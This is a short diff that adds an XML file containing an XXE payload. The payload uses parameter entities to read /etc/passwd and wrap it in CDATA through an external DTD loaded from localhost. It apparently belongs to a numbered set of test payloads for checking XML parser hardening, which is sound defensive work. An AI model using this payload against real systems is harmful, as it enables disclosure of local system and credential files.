@@ -1,0 +1,10 @@
+ <?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE data [
+<!ELEMENT data (#ANY)>
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % goodies SYSTEM "file:///etc/passwd">
+<!ENTITY % end "]]>">
+<!ENTITY % dtd SYSTEM "http://localhost/payload_6_file_parameterEntity_core.dtd">
+%dtd;
+]>
+<data>&all;</data>
